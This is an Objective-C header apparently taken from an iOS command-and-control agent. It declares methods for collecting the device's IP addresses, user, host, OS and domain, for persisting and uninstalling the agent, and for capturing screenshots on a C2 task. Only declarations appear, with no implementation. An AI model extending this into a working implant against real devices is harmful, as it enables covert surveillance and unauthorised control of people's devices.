#import <Foundation/Foundation.h>
#import <ifaddrs.h>
#import <arpa/inet.h>
#import <sys/types.h>
#import <sys/sysctl.h>
#import <UIKit/UIKit.h>
#include <mach-o/dyld.h>

#import "../c2/C2Task.h"
#import "../bridge/NSTask.h"

@interface SystemInfoHelper : NSObject

+ (NSString *)getInternalIPAddress;
+ (NSString *)getExternalIPAddress;
+ (NSString *)getArchitecture;
+ (NSInteger)getPID;
+ (BOOL)isRootUser;
+ (NSString *)getUser;
+ (NSString *)getHost;
+ (NSString *)getOS;
+ (NSString *)getDomain;
+ (BOOL)uninstallAgent;
+ (BOOL)persistAgent;
+ (BOOL)agentIsInstalled;
+ (NSString *)getProcessName;
+ (void)takeScreenshotWithTask:(id)task;

@end
